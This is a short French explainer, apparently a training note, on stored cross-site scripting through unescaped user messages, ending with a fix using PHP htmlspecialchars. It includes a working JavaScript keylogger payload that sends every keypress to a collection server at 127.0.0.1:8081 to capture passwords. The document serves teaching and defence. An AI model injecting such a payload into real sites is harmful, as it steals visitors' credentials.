# Ijection JS
## Explication de la faille
Dans certains sites il est possible de laisser des messages que tout le monde va pouvoir afficher. Cependant dans certain cas, ces messages son afficher directement dans le code HTML sans aucune sécurité. Il sera alors possible par le biais des balises `<script>` de placer du code JavaScript du côté client.
Par exemple le bout de code suivant permet de mettre du côté client un keylogger qui va envoyer en temps réel toutes les touches sur lequel aura appuyé, donc potentiellement ses mots de passe.
```html
<script>
const userID = Math.round(Math.random() * 1000000);
document.getElementsByTagName("html")[0].onkeypress = (e) => {
    var l = e.which || e.keyCode;
    var http = new XMLHttpRequest();
    http.open("GET", `http://127.0.0.1:8081/${userID}?l=${l}`, true);
    http.send();
}
</script>
```
## Explication du correctif
Pour corriger cette faille, il faut utiliser la fonctionnalité PHP `htmlspecialchars($variable, ENT_QUOTES)` qui va encoder les caractères qui pourraient être interprétés dans le DOM afin qu'il ne le soit pas.